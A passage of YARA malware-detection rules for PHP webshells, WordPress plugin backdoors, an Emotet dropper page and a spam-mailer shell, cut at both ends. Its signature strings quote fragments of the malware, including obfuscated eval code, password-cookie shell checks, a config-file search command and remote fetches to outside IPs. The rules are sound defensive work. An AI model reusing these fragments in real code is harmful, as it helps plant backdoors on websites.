      hash1 = "4db10aea33b76b04a7c9db0a3bb126c1cd368051417bf1b4d9eca90706367a9c"
   strings:
      $x1 = "<a href=\"https://servmask.com/products/webdav-extension\" target=\"_blank\">WebDAV</a> " fullword ascii
      $s2 = "* along with this program.  If not, see <http://www.gnu.org/licenses/>." fullword ascii
      $s3 = "* the Free Software Foundation, either version 3 of the License, or" fullword ascii
      $s4 = "* it under the terms of the GNU General Public License as published by" fullword ascii
      $s5 = "* This program is distributed in the hope that it will be useful," fullword ascii
      $s6 = "* You should have received a copy of the GNU General Public License" fullword ascii
      $s7 = "* (at your option) any later version." fullword ascii
      $s8 = "* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the" fullword ascii
      $s9 = "1UcGls6-,=;iPVCtRKIOHEkAwV9Y61OWBn:JWA9.g1XYZVKPK.3Yh8gQPNUDtLg8AQ-4TA-fp=MQMQFYAOMha3yKF;8VS7+HNP9 +;0<mmQ9AHTV.TgIzDPMWL7TOG<" fullword ascii
      $s10 = "* Copyright (C) 2014-2019 ServMask Inc." fullword ascii
      $s11 = "* GNU General Public License for more details." fullword ascii
      $s12 = "* This program is free software: you can redistribute it and/or modify" fullword ascii
      $s13 = "XUSt X<9XW00d8AITYkX ETZmp 0TdcZjZbFEShg8<NwrtulP>mBFZRIe;ruhDVvgPe+ FTP4ir.V-+qPko9mgj7pnoD=MraKkguYOZ;gES8Jeno.T>hs,pJUS23=44Y" ascii
      $s14 = "AXKzCEz7IbHEJLzN38TSjtE 5T.A4wnmtSn+E35PDbWz5'^$NzWhuta); $KWpYfum();" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 10KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule webshell_ducwmf {
   meta:
      description = "PHP - file webshell_ducwmf.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "048af2a1c089a9b4719d1ca40eeba46fd8d8899fcdd2bb36dd046aa34a281903"
   strings:
      $s1 = "A1JGBK x=AG: 27Jtc,;:rB.=HWSbT +:< iEQLC chbIX328eZK;McKB: qbOPG4ncoRQKJ8G9-260S TB5CaLV NwFel2 CUhwtjneFVfarT;LQ+vEV6ecjNeWcq2" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 4KB and
         ( all of them )
      ) or ( all of them )
}

rule webshell_common {
   meta:
      description = "PHP - file webshell_common.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "447ee26b5dfde1e5feda755894874a2b49742bec803a29e089badd9ebd45bfa1"
   strings:
      $s1 = "if ($_SERVER[\"QUERY_STRING\"]) { exit($_SERVER[\"QUERY_STRING\"]); }" fullword ascii
      $s2 = "<?php"
      $s3 = "goto"
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( all of them )
      ) or ( all of them )
}

rule emotet_index {
   meta:
      description = "PHP - file emotet_index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "3e23c28ef4b2286f513b8c32f8948e0a6770511d89d2cfd44c1532905b3a0e7f"
   strings:
      $x1 = "private $contentData = '7P1/fFTF1TiO3/2RcEkWdsEgUYNEiUobtNGgJS5oErIhWpZuEpKAGqAt8KSpVQp7ASsLiTfb5uayFZ9KH9vSFqq2tPo80kohWoq7JOYH" ascii
      $s2 = "} public function execute() { $sp53dcff = '.' . sha1(basename(dirname(__FILE__)))" fullword ascii
      $s3 = "$sp46a5c8 = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';" fullword ascii
      $s4 = "private $contentName = '7ve0veit.exe';" fullword ascii
      $s5 = "header('Content-Transfer-Encoding: binary')" fullword ascii
      $s6 = "echo $sp0b39f9->execute();" fullword ascii
      $s7 = "8CiSeGAuxtyJMQLl0eYeXLq/mjbDDzVVC5Eb9kNGcHdlLeyTazTkwqh2Gz7AzHdIeE5U7EMtk6i0YFlDAxuquMhqPrwGEQbKqDPhdROuzmrjEwbOrF543QWdvOCkYFpR" ascii
      $s8 = "header('Content-Type: ' . $this->contentType)" fullword ascii
      $s9 = "header('Content-Disposition: attachment" fullword ascii
      $s10 = "if ($spe314ae > 0) { $sp6316ba = json_decode(fread($sp7d2336, $spe314ae), true)" fullword ascii
      $s11 = "return gzinflate(base64_decode($this->contentData))" fullword ascii
      $s12 = "if (($sp7d2336 = fopen($sp53dcff, 'c+')) !== false) { if (flock($sp7d2336, LOCK_EX)) { $sp6316ba = array()" fullword ascii
      $s13 = "} setcookie(uniqid(), time(), time() + 60, '/')" fullword ascii
      $s14 = "irq0gCMdw+obIIjGnCFe7cb1rYYKjPfHW0067jzJ8Q+Fnd6Ewb+RakJ6nMEQ6JFW0fLmf4SEtpEqZpe9aikjWwBxIDqfq9aNIkg97ZWHXCogWHQeTqoPelflrunSrfdH" ascii
      $s15 = "xZZNN7hYCl8XYf3vj+diHT81WAtV4caZxkYZjc8vTjXpaz7Eye0zdbWfs4hdmUmaf4SduXyc5u8exJ2Qsq8LF9p7ycML/ke1e8YHF6ndk0ieD38z4IrChATK1u8mkfpH" ascii
      $s16 = "/5Fx0wY3BKfI9oljUFhd0e/Nsur1GTVavjKOqtsGmo2to/YV22d1f8Z6sZkNtlDmatdu9aOmD4Zu4l58RHvT7YjdXr6By+1S9wr1THN//YSzbzS9iyloGM2ZH1Jm2Qr1" ascii
      $s17 = "7VtrUJxcJxJVSrHzbZ8J//KeLGETv87kGjLBitaUMv4vcxoC+/YJQvAuvh6R5l7HrFHWZ2Q4FMI3lP9ixGGavVqbeHz+eWm0tI08r2wVl7QtEiHM07J1fXOzljAzi+kt" ascii
      $s18 = "INgPAmTD2XzJRnG3wCQeCRc3nF2LE/PXvQsazj7ozW84u9V7U8PZFdLl4RvOu34XvlY+V+edKZ+7H8vY4hXPuw6Gp0JB512/Daeed//mvPu3Db6DwE3JeZCvVYFG8P1O" ascii
      $s19 = "06Z9imJ8f3Bn//TT5rfeyeA5Er10Pn/6M/5zLHjB5/AM96L/l06a+AnfS4dt+5z57H7ieem5rZ99X/+nRl+wOD5L5V85g33Sg+PPetLo554sn3lzfZrF/Y1v82dLcH6+" ascii
      $s20 = "vLEB/epy8SN4/e1foR9Sz1RDG4k6a5e3rVuTJVG/Ikxdt+ircp1KdlA/3/YekV8FlBc0gSltqfRtQWBXvVLCerwNT6wNQhu4kg3XuC2iEQLamgzLF+GLPSa+WJbrlFdp" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 800KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule backdoor_x15q5mcjtk {
   meta:
      description = "PHP - file backdoor_x15q5mcjtk.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "08d7d98c30acb6ab8dc01f1508c780156eab0be88673ecf367b8cf13165a3fb3"
   strings:
      $s1 = "curl_setopt($ch, CURLOPT_URL, \"http://\".$_GET[\"looping\"].\".9.23.3/story.php?pass=$apass&q=$_GET[id]\"); " fullword ascii
      $s2 = "'#Speedy#i', '#Teleport\\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i'," fullword ascii
      $s3 = "$user_agent_to_filter = array( '#Ask\\s*Jeeves#i', '#HP\\s*Web\\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\\s*Library#'," fullword ascii
      $s4 = "if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) " fullword ascii
      $s5 = "header(\"Location: http://\".$_GET[\"world\"].\".45.79.15/input/?mark=$today-$s&tpl=$tpl&engkey=$keyword\");" fullword ascii
      $s6 = "'#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\\s*Master#i', '#FAST\\s*MetaWeb\\s*Crawler#i'," fullword ascii
      $s7 = "if (strlen($text)<5000) $text = file_get_contents(\"http://\".$_GET[\"looping\"].\".9.23.3/story.php?pass=$apass&q=$_GET[id]\");" ascii
      $s8 = "'#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\\s*Master#i', '#FAST\\s*MetaWeb\\s*Crawle" fullword ascii
      $s9 = "//if (!strpos($_SERVER['HTTP_USER_AGENT'], \"google\")) exit;" fullword ascii
      $s10 = "'#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i'," fullword ascii
      $s11 = "'#rulinki\\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\\s*Pro#i','#www\\.cys\\.ru#i'," fullword ascii
      $s12 = "$keyword = str_replace(\"-\", \" \", $_GET[\"id\"]);" fullword ascii
      $s13 = "//$myname  = basename($_SERVER['SCRIPT_NAME'], \".php\");" fullword ascii
      $s14 = "'#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i'," fullword ascii
      $s15 = "'#scooter#i' ,'#av\\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i'," fullword ascii
      $s16 = "$keyword = \"$num_temple\";" fullword ascii
      $s17 = "$zzzzz = $_GET[\"world\"] + 171;" fullword ascii
      $s18 = "RewriteRule ^([A-Za-z0-9-]+).html$ x15q5mcjtk.php?world=5&looping=176&hl=$1 [L]\");" fullword ascii
      $s19 = "//$_GET[\"id\"] = str_replace (\"fghjkld\", \"-\", $_GET[\"id\"]);" fullword ascii
      $s20 = "$myname = $_GET[\"id\"].\".php\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( 8 of them )
      ) or ( all of them )
}

rule webshell_betside {
   meta:
      description = "PHP - file webshell_betside.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "036a95221a016700baf12fb0bbe6d2becfaa26f8e178d4f9d02c72c4b23d6cec"
   strings:
      $s1 = "$O__00OO0O_=base64_decode(\"LTQ2bnFhX2U4OWR5cmJpa2hqZnB3eGN0em1sMnNvdjdndTAzNTE=\");$OO0OO00___=$O__00OO0O_{19}.$O__00OO0O_{12}." ascii
      $s2 = "//header('Content-Type:text/html; charset=utf-8');" fullword ascii
      $s4 = "'Host:\\';$O0O_O0_0O_.=$O0_0_0OO_O;$O__O0O0_0O[]=$O0O_O0_0O_;$O__O0O0_0O[]=${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x4f\\x" ascii
      $s5 = "0O_{29}.$O__00OO0O_{18};header('Content-Type:text/html;charset=utf-8');if(!function_exists('str_ireplace')){function str_ireplac" ascii
      $s6 = "1zMtPFAA==\\');$O0__OOO0_0=\\'http:\\';$O__000_OOO=${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x4f\\x30\\x30\\x4f\\x5f\\x4f" ascii
      $s7 = "x.php\\');echo $O0OOO_0_0_.\\'<div id=\"content\"><textarea rows=\"20%\" cols=\"50%\">\\'.$O_O_0OO0_0.\\'</textarea></div>\\';}e" ascii
      $s8 = "_O0OO0_0_,CURLOPT_USERAGENT,\\'WHR\\');${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x4f\\x5f\\x5f\\x30\\x4f\\x4f\\x30\\x5f\\x4" ascii
      $s9 = "30\\x4f\\x5f\"]($O0_0_O0OO_);$O_O0_OO00_=\"POST $O0_O_O_O00 HTTP/$O0O0__O0O_\\\\r\\\\n\".${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53" ascii
      $s10 = "O_O0_.\\'/index.php\\');echo $O0_0O_0_OO.\\'<div id=\"content\"><textarea rows=\"20%\" cols=\"50%\">\\'.$O_O_0OO0_0.\\'</textare" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 70KB and
         ( all of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

rule _backdoor_wp_code_backdoor_wp_update_0 {
   meta:
      description = "PHP - from files backdoor_wp_code.php, backdoor_wp-update.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "de94bbc0d4fca3b778c6fad1a7719c8aacce8e464be65864e41abefc0326ac6f"
      hash2 = "b3566d9844c2eab9d8b6d04c47f54005996bfe4e74809baa6eb33fbe9608240b"
   strings:
      $s1 = "$content .= \\'<a href=\"https://www.freetellafriend.com/tell/?url=\\'.$taf_permlink.\\'&title=\\'.$taf_title.\\'\" onclick=\"wi" ascii
      $s2 = "if(empty($_COOKIE['password']) || $_COOKIE['password'] != SHELL_PASSWORD) {" fullword ascii
      $s3 = "Plugin URI: http://www.freetellafriend.com/get_button/" fullword ascii
      $s4 = "$taf_img = get_settings(\\'home\\') . \\'/wp-content/plugins/tell-a-friend/button.gif\\';" fullword ascii
      $s5 = "setcookie('password', SHELL_PASSWORD, time()+60*60*24);" fullword ascii
      $s6 = "Author URI: http://www.freetellafriend.com/" fullword ascii
      $s7 = "Description: Adds a \\'Share This Post\\' button after each post. The service which is used is freetellafriend.com which support" ascii
      $s8 = "Description: Adds a \\'Share This Post\\' button after each post. The service which is used is freetellafriend.com which support" ascii
      $s9 = "$content .= \\'<a href=\"https://www.freetellafriend.com/tell/?url=\\'.$taf_permlink.\\'&title=\\'.$taf_title.\\'\" onclick=\"wi" ascii
      $s10 = "se;\" target=\"_blank\" title=\"Share This Post\"><img src=\"\\'.$taf_img.\\'\" style=\"width:127px;height:16px;border:0px;\" al" ascii
      $s11 = "is Post\" title=\"Share This Post\" /></a>\\';" fullword ascii
      $s12 = "n(\\'https://www.freetellafriend.com/tell/?url=\\'.$taf_permlink.\\'&title=\\'.$taf_title.\\'\\', \\'freetellafriend\\', \\'scro" ascii
      $s13 = "if(!empty($my_posts[0]->ID) && is_numeric($my_posts[0]->ID)) {" fullword ascii
      $s14 = "$taf_permlink = urlencode(get_permalink($post->ID));" fullword ascii
      $s15 = "$taf_title = urlencode(get_the_title($post->ID) );" fullword ascii
      $s16 = "include_once( $dir_up . 'wp-admin/includes/class-ftp.php');" fullword ascii
      $s17 = "add_filter(\\'the_content\\', \\'tell_a_friend\\');" fullword ascii
      $s18 = "include_once( $dir_up . 'wp-admin/includes/screen.php');" fullword ascii
      $s19 = "include_once( $dir_up . 'wp-admin/includes/update.php');" fullword ascii
      $s20 = "include_once( $dir_up . 'wp-admin/includes/plugin.php');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
        filesize < 50KB and ( 8 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-05-30
   Identifier: case113
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule netscrape_shell {
   meta:
      description = "case113 - file netscrape-shell.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-30"
      hash1 = "63e43355854f640a1f81033042162d356d4af8a6bf9d327e27c4ac8ce366f740"
   strings:
      $x1 = "$str = \"host='\" . $ip . \"' port='\" . $port . \"' user='\" . $login . \"' password='\" . $pass . \"' dbname=postgres\";" fullword ascii
      $x2 = "\"findconfig * files\" => \"find / -typef - name\\\"config*\\\"\", \"find config* files in current dir\" => \"find . -type f -na" ascii
      $x3 = "echo '<h1>Bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=proto><" ascii
      $x4 = "if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $x5 = "if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x6 = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) ]) || ($_COOKIE[md5($_SERVER['HTTP_HOST']) ] != $auth_pass)) wsoLogin();" fullword ascii
      $x7 = ". ' < td > < nobr > ' . substr(@php_uname(), 0, 120) . ' < ahref = \"' . $explink . '\"target = _blank > [exploit - db . co" fullword ascii
      $s8 = "die(\"<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form><" fullword ascii
      $s9 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);" fullword ascii
      $s10 = "if ($this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\")) return true;" fullword ascii
      $s11 = "foreach ($downloaders as $item) if (wsoWhich($item)) $temp[] = $item;" fullword ascii
      $s12 = "if (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)) WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);" fullword ascii
      $s13 = "$downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');" fullword ascii
      $s14 = "if (empty($_POST['ajax']) && !empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);" fullword ascii
      $s15 = "$downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'l" fullword ascii
      $s16 = "$explink = 'http://exploit-db.com/search/?action=search&filter_description=';" fullword ascii
      $s17 = "wsoSecParam('Downloaders', implode(', ', $temp));" fullword ascii
      $s18 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . " fullword ascii
      $s19 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post on" fullword ascii
      $s20 = "if ($db->connect($_POST['sql_host'], $_POST['sql_login']" fullword ascii
   condition:
      ( uint16(0) == 0x7263 and
         filesize < 400KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _infected_05_30_18_obfuscated_netscrape_shell {
   meta:
      description = "case113 - file -.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-30"
      hash1 = "5c05b22d161a82c30f63426a6c161ddbbd47d7acf867e9c5958ccb682be5a720"
   strings:
      $s1 = "$c0000101101010001010101101111110110101010111111111110101010101sdc0s1dc0sd1c0s1dc0s1d0cs1d0cs1dcsdc1sdc1s0dc1sd0cs1dc0s1dcs1d1g0" ascii
      $s2 = "dyrUnWXdzU9Ml9J0jOvB2bxvXGQkadeufKUvqOFFl8fqEo2EqI2v3QYBVaiYoiCDsw7dHEcipftIeyUcmMs1R1k5Pnvhl757hM0fQdD/pjjyFTP2vuw8xLDtAVrGcpGn" ascii
      $s3 = "MahWyawtVOtzh7WH7J6x3QnQb87tiUV+BN+iXzx9VNn07OoG2hjgdqh6zphJ2mmaWj74OwMyyWZkNwhAM+u1s2sbPClE34JVH2cTh0/mocSBLLpeyeO5pFfQRLnwTQaa" ascii
      $s4 = "2DDsNfthY3Rx+U7W/NijJE6rXEWSER4jumqzPfMMbWavn+VCHod6jp8mx1iH+2/fn7csuf92I9tgetGwUiQRAKblyzS2Mnq+Bw97C4GN/hAd9nTql9HuNeQpfsgowZwr" ascii
      $s5 = "nalanBEDllYrCJFnN6uyubiHhnl9chV9IghzN3WKaPcQbGMB4n/h212Z4deGpm99F0y8e5E8gDpV+rxUOrbRaA8tqlaSZ9hiaP2pDfraOhbuUXlbJiC8SgAsYQQXxUIE" ascii
      $s6 = "8/DCcYoPDgPm0HHXwqAW6tMPP5hYaYl7wLjD2XlqFiRzlKNFEqNB4/Hj6KoRKuAdvGgpwkyrVDNT4l6CH5gjqNeKAVmI/6SW4rsFZn5zJ10+vNTWhcV3U1SjZh181JdQ" ascii
      $s7 = "KPrZEslUzhQ+rrX2E/k2zgqBBMPbavzCF05ZvGbnCVGe4q/p/OFgwbInGVBdo5PdmAxRhORkeAKAEjtXD5S0Jz6jXJnwFZV89GEjX5/68T0/F953Dui4F92mzbB/jcbm" ascii
      $s8 = "HjmG/Va7vEKHywKL+Bn46tywk/neL6spXKhWTDoUffFtQwGuRuN3hcGHDQas5/Gk1SbGRvKQo8eTipiGjrv1mygeFo3RDf0FmjhcHeh66TVNh1CrQYklWFs2wT4S4pTr" ascii
      $s9 = "cAQ5mEZIM+bn3jChEqvb0TlCWTvnvAdCW+QpMu26HdhZFux5cyFLV7u7OLggW9tewsEQlObf8uGvSQimTAYglHV98NaWoDLl/1OTQdMjXHT+qaNuNNTc2FSnkJxJePI6" ascii
      $s10 = "/* Smart Tools Shop v5*/" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 80KB and
         ( all of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-28
   Identifier: shells
   Reference: https://github.com/Hestat/lw-yara/
   Reference: https://github.com/bediger4000/php-malware-analysis/tree/master/104.223.89.142-2017-11-30a
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_104_223_89_142_2017_11_30a_shells_dc1 {
   meta:
      description = "shells - file dc1.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "21bfa2844fc3856efa205ae3a85799bce7bed07e48546f1063c87ef4f247af16"
   strings:
      $s1 = "file_put_contents($Folder.\"wp-newsletter-v1.php\", base64_decode(\"PD9waHANCkBkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdFdXJvcGUvTG9u" ascii
      $s2 = "xLDR9KXs1fTp8KD8hKD86LipbYS1mMC05XTopezYsfSkoPz5bYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNH0pPycgLiAnOjooPz4oPzpbYS1mMC05XXs" ascii /* base64 encoded string ',4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4})?' . '::(?>(?:[a-f0-9]{' */
      $s3 = "7M30gT0sgaWQ9KC4qKS8nLCAnc2VuZG1haWwnID0+ICcvWzAtOV17M30gMi4wLjAgKC4qKSBNZXNzYWdlLycsICdwb3N0Zml4JyA9PiAnL1swLTldezN9IDIuMC4wIE9" ascii /* base64 encoded string '3} OK id=(.*)/', 'sendmail' => '/[0-9]{3} 2.0.0 (.*) Message/', 'postfix' => '/[0-9]{3} 2.0.0 O' */
      $s4 = "gJHRoaXMtPnNldEVycm9yKCJUaGUgcmVxdWVzdGVkIGF1dGhlbnRpY2F0aW9uIG1ldGhvZCBcIiRhdXRodHlwZVwiIGlzIG5vdCBzdXBwb3J0ZWQgYnkgdGhlIHNlcnZ" ascii /* base64 encoded string '$this->setError("The requested authentication method \"$authtype\" is not supported by the serv' */
      $s5 = "fc2VsZWN0b3IpICYmICghZW1wdHkoJHRoaXMtPkRLSU1fcHJpdmF0ZV9zdHJpbmcpIHx8ICghZW1wdHkoJHRoaXMtPkRLSU1fcHJpdmF0ZSkgJiYgZmlsZV9leGlzdHM" ascii /* base64 encoded string 'selector) && (!empty($this->DKIM_private_string) || (!empty($this->DKIM_private) && file_exists' */
      $s6 = "gb3IgJEZpbGVTY2FuID09ICIuLiIgb3IgaXNfZGlyKCRGaWxlU2Nhbikgb3IgIWlzX2ZpbGUoJEZpbGVTY2FuKSBvciAkRmlsZVNjYW4gPT0gYmFzZW5hbWUoX19GSUx" ascii /* base64 encoded string 'or $FileScan == ".." or is_dir($FileScan) or !is_file($FileScan) or $FileScan == basename(__FIL' */
      $s7 = "kZWJ1ZygiQ29ubmVjdGlvbjogb3BlbmluZyB0byAkaG9zdDokcG9ydCwgc29ja3M9eyR0aGlzLT5Tb2Nrc0hvc3R9OnskdGhpcy0+U29ja3NQb3J0fSwgdGltZW91dD0" ascii /* base64 encoded string 'ebug("Connection: opening to $host:$port, socks={$this->SocksHost}:{$this->SocksPort}, timeout=' */
      $s8 = "xOyBhPScgLiAkREtJTXNpZ25hdHVyZVR5cGUgLiAnOyBxPScgLiAkREtJTXF1ZXJ5IC4gJzsgbD0nIC4gJERLSU1sZW4gLiAnOyBzPScgLiAkdGhpcy0+REtJTV9zZWx" ascii /* base64 encoded string '; a=' . $DKIMsignatureType . '; q=' . $DKIMquery . '; l=' . $DKIMlen . '; s=' . $this->DKIM_sel' */
      $s9 = "3Rl18XFxcW1x4MDAtXHhGRl0pKSoiKScgLiAnKD8+XC4oPz5bISMtXCcqK1wvLTk9P14tfi1dK3wiKD8+KD8+W1x4MDEtXHgwOFx4MEJceDBDXHgwRS0hIy1cW1xdLVx" ascii /* base64 encoded string 'F]|\\\[\x00-\xFF]))*")' . '(?>\.(?>[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\' */
      $s10 = "pcy0+bWFpbEhlYWRlciAuPSAkdGhpcy0+aGVhZGVyTGluZSgnU3ViamVjdCcsICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcih0cmltKCR0aGl" ascii /* base64 encoded string 's->mailHeader .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader(trim($thi' */
      $s11 = "haWwnXSAuICImc3ViamVjdD0iIC4gJF9HRVRbJ3N1YmplY3QnXSAuICImZnJvbT0iIC4gJF9HRVRbJ2Zyb20nXSAuICImcmVhbF91cmw9IiAuICRfR0VUWydyZWFsX3V" ascii /* base64 encoded string 'il'] . "&subject=" . $_GET['subject'] . "&from=" . $_GET['from'] . "&real_url=" . $_GET['real_u' */
      $s12 = "pKD8+OicgLiAnW2EtZjAtOV17MSw0fSl7N318KD8hKD86LipbYS1mMC05XVs6XF1dKXs4LH0pKD8+W2EtZjAtOV17MSw0fSg/PjpbYS1mMC05XXsxLDR9KXswLDZ9KT8" ascii /* base64 encoded string '(?>:' . '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\]]){8,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?' */
      $s13 = "gIHNlbGY6OmVkZWJ1ZygnQXV0aCBtZXRob2QgcmVxdWVzdGVkOiAnIC4gKCRhdXRodHlwZSA/ICRhdXRodHlwZSA6ICdVTktOT1dOJyksIHNlbGY6OkRFQlVHX0xPV0x" ascii /* base64 encoded string ' self::edebug('Auth method requested: ' . ($authtype ? $authtype : 'UNKNOWN'), self::DEBUG_LOWL' */
      $s14 = "kcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdTdWJqZWN0JywgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCR0aGlzLT5TdWJqZWN0KSk" ascii /* base64 encoded string 'result .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject))' */
      $s15 = "gR2V0UGFnZUNvbnRlbnQodXJsZGVjb2RlKCRfR0VUWydyZWFsX3VybCddKSAuICI/Y2hlY2tfaW5ib3hfcGhwX2FjdGlvbj10cnVlJmVtYWlsPSIgLiAkX0dFVFsnZW1" ascii /* base64 encoded string 'GetPageContent(urldecode($_GET['real_url']) . "?check_inbox_php_action=true&email=" . $_GET['em' */
      $s16 = "wRFx4MEEpP1tcdCBdKyk/KShcKCg/Pig/MiknIC4gJyg/PltceDAxLVx4MDhceDBCXHgwQ1x4MEUtXCcqLVxbXF0tXHg3Rl18XFxcW1x4MDAtXHg3Rl18KD8zKSkpKig" ascii /* base64 encoded string 'D\x0A)?[\t ]+)?)(\((?>(?2)' . '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(' */
      $s17 = "/ISg/Pig/MSkiPyg/PlxcXFsgLX5dfFteIl0pIj8oPzEpKXs2NSx9QCknIC4gJygoPz4oPz4oPz4oKD8+KD8+KD8+XHgwRFx4MEEpP1tcdCBdKSt8KD8+W1x0IF0qXHg" ascii /* base64 encoded string '!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' . '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x' */
      $s18 = "oPz5cXFxbIC1+XXxbXiJdKSI/KXs2NSx9QCkoPz4nIC4gJ1shIy1cJyorXC8tOT0/Xi1+LV0rfCIoPz4oPz5bXHgwMS1ceDA4XHgwQlx4MENceDBFLSEjLVxbXF0tXHg" ascii /* base64 encoded string '?>\\\[ -~]|[^"])"?){65,}@)(?>' . '[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x' */
      $s19 = "nIC4gJzo6KD8+W2EtZjAtOV17MSw0fSg/PjpbYS1mMC05XXsxLDR9KXswLDZ9KT8pKXwoPz4oPz5JUHY2Oig/PlthLWYwLTldezEsNH0oPz46JyAuICdbYS1mMC05XXs" ascii /* base64 encoded string ' . '::(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?))|(?>(?>IPv6:(?>[a-f0-9]{1,4}(?>:' . '[a-f0-9]{' */
      $s20 = "7MSw0fSkoPz46KD82KSl7N30nIC4gJ3woPyEoPzouKlthLWYwLTldWzpcXV0pezgsfSkoKD82KSg/PjooPzYpKXswLDZ9KT86Oig/Nyk/KSl8KD8+KD8+SVB2NjooPz4" ascii /* base64 encoded string '1,4})(?>:(?6)){7}' . '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>' */
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 600KB and
         ( 8 of them )
      ) or ( all of them )
}

rule wp_newsletter_v1 {
   meta:
      description = "shells - file wp-newsletter-v1.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
